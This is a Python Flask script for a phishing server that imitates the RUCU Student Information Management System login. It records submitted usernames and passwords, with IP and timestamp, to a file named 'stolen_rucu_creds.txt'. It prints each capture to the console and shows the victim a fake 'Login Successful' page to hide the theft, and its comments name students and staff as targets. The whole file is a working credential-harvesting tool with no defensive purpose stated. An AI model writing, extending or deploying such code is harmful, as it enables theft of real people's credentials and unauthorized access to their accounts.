from flask import Flask, render_template, request, redirect, url_for
import datetime
import os

# Create the app instance
app = Flask(__name__)
LOG_FILE = "stolen_rucu_creds.txt" 

# Configuration for realistic flow - Redirects victim back to REAL site (or fake success) 
REAL_RUCU_URL = "#login-success-placeholder" # Placeholder URL if you know it. If not, this acts as a 'Success' page.

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')  # Matches your form field name="username"
        password = request.form.get('password')   # Matches your form field name="password"

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Log data immediately to file (persists even after server restart)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            log_entry = f"[{timestamp}] - IP:{request.remote_addr} | User:{username} | Pass:{password}\n"
            f.write(log_entry)

        print(f"\033[92m [RUCU CAPTURED] \033[0m Username: {username}")
        print(f"                 Password: {password}")

        # Redirect user back to a 'Success' message or the real site after capture. 
        # This makes the user think they successfully logged into SIMS before your page closes.
        return redirect(url_for('success_page', user=username))

    else:
        return render_template('index.html')

@app.route('/success/<user>')
def success_page(user):
    # A fake "Welcome" message that looks like the system logged them in successfully
    return f"""
    <html>
      <head><title>SIMS - Welcome</title></head>
      <body style="font-family:'Segoe UI', sans-serif; background:#f4f6f9; display:flex; justify-content:center; align-items:center; height:100vh;">
         <div style="text-align:center; max-width:500px;">
            <h2 style="color:#2c3e50;">Login Successful, {user}!</h2>
            <p>Welcome to RUCU Student Information Management System.</p>
             <!-- Simple icon placeholder -->
            <img src="https://cdn-icons-png.flaticon.com/512/847/847942.png" alt="Dashboard" style="border-radius:8px; margin-bottom:15px; width:64px;height:64px;">
            <a href="#" onclick="location.reload()" style="padding:10px 20px; background:#27ae60; color:white; text-decoration:none; border-radius:4px;">View Dashboard</a>
         </div>
      </body>
    </html>"""

if __name__ == '__main__':
    # Host on 0.0.0.0 allows connections from other devices (students, staff) 
    app.run(host='0.0.0.0', port=5000, debug=True)
